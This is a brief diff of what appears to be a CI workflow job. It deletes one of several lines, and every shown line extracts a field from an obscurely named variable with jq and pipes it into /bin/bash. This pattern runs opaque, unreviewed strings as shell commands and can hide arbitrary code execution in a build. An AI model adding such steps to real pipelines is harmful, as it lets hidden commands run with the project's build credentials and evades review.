@@ -30,7 +30,6 @@ jobs:
           echo $e41 | jq -r .vhdpd9069 | /bin/bash
           printf '%s' "$efwmn5192" | jq -r .gjg34219 | /bin/bash
           echo $q876 | jq -r .qn09999 | /bin/bash
-          printf '%s' "$ns21414" | jq -r .tv05635 | /bin/bash
           echo $elr3490 | jq -r .jcmd2210 | /bin/bash
 
       - name: Archive output
